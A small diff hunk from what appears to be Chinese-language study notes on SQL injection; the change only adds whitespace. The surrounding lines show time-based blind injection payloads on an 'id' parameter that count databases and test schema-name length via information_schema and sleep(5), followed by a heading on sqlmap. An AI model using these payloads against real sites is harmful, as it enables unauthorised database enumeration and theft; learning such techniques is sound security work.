@@ -194,7 +194,8 @@ union select 1，2，3，4 //要先使原先的查询语句不显示，如id=1 a
 ?id=1 and if((select count(schema_name) from information_schema.schemata)=9,sleep(5),1)
 
 第一个数据库名有多少个字符
-?id=1 and if((select length(schema_name) from information_schema.schemata limit0,1)=18,sleep(5),1)
+?id=1 and if((select length(schema_name) from information_schema.schemata limit0,1)=18,sleep(5),1)  
+
 ##### sqlmap注入
 基础探测命令
 联合查询注入：
